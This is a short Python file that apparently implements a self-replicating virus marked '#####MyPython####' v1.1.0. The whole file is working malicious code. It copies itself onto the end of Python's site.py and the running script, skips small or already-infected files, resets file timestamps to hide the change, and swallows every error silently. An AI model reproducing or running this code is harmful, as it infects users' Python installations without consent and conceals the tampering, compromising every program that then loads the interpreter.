mark="#####MyPython####"#v1.1.0
code=''
with open(__file__,encoding="utf-8") as f:
    for line in f:
        if mark in line.strip():
            code=line+f.read()

def spread_to_file(file):
    import os;stat=os.stat(file)
    old_time=stat.st_atime,stat.st_mtime
    with open(file,'r',encoding='utf-8') as f:
        for line in f:
            if mark in line:return
    if os.path.getsize(file)>=2048:
        with open(file,'a',encoding='utf-8') as f:
            f.write('\n'+code)
        os.utime(file,old_time)

def spread(mod):
    spread_to_file(__import__(mod).__file__)

try:
    spread('site')
    spread_to_file(__import__("sys").argv[0])
except:pass
del spread,spread_to_file,code,mark,f,line